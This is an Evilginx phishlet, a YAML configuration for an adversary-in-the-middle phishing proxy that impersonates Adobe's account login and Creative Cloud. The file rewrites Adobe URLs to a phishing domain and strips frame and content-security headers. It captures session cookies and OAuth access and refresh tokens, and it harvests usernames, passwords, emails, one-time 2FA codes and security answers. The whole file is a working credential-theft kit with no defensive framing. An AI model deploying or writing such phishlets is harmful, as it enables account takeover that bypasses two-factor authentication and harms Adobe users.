min_ver: '3.0.0'
author: 'evilginx3'
redirect_url: 'https://accounts.adobe.com/'

proxy_hosts:
  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'adobe.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'adobe.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'adobelogin', orig_sub: 'adobelogin', domain: 'adobelogin.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'cc', orig_sub: 'cc', domain: 'adobe.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'api', orig_sub: 'api', domain: 'adobe.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'adobe.com', session: false, is_landing: false, auto_filter: true}

sub_filters:
  # Replace Adobe domain URLs
  - {triggers_on: 'accounts.adobe.com', orig_sub: 'accounts', domain: 'adobe.com', search: 'https://accounts\\.adobe\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'accounts.adobe.com', orig_sub: 'www', domain: 'adobe.com', search: 'https://www\\.adobe\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'accounts.adobe.com', orig_sub: 'adobelogin', domain: 'adobelogin.com', search: 'https://adobelogin\\.adobelogin\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'accounts.adobe.com', orig_sub: 'cc', domain: 'adobe.com', search: 'https://cc\\.adobe\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'accounts.adobe.com', orig_sub: 'api', domain: 'adobe.com', search: 'https://api\\.adobe\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'accounts.adobe.com', orig_sub: 'cdn', domain: 'adobe.com', search: 'https://[a-z0-9-]+\\.adobe\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/javascript']}
  
  # Remove security headers
  - {triggers_on: 'accounts.adobe.com', orig_sub: 'accounts', domain: 'adobe.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'accounts.adobe.com', orig_sub: 'accounts', domain: 'adobe.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'accounts.adobe.com', orig_sub: 'adobelogin', domain: 'adobelogin.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'accounts.adobe.com', orig_sub: 'adobelogin', domain: 'adobelogin.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}

auth_tokens:
  # Primary Adobe authentication cookies
  - domain: '.adobe.com'
    keys: ['s_cc', 's_sq', 's_vi', 's_fid', 's_ccid', 's_cc_*']
    type: 'cookie'
  
  # Session and security cookies
  - domain: '.adobe.com'
    keys: ['s_ecid', 's_ecid_*', 's_ecid_ss', 's_ecid_ss_*']
    type: 'cookie'
    optional: true
  
  # OAuth tokens
  - domain: '.adobe.com'
    keys: ['oauth_token', 'oauth_token_secret', 'access_token', 'refresh_token']
    type: 'cookie'
    optional: true
  
  # Adobe ID cookies
  - domain: '.adobelogin.com'
    keys: ['adobe_identity', 'adobe_identity_*', 'adobe_session']
    type: 'cookie'
    optional: true

credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  
  # Alternative email field
  email:
    key: 'email'
    search: '(.*)'
    type: 'post'
  
  # 2FA codes
  totp_code:
    key: 'totp_code'
    search: '(.*)'
    type: 'post'
  
  # SMS codes
  sms_code:
    key: 'sms_code'
    search: '(.*)'
    type: 'post'
  
  # Security questions
  security_answer:
    key: 'security_answer'
    search: '(.*)'
    type: 'post'

auth_urls:
  - '^/account'
  - '^/account/profile'
  - '^/account/security'
  - '^/account/subscription'
  - '^/creativecloud'
  - '^/apps'

login:
  domain: 'accounts.adobe.com'
  path: '/login'

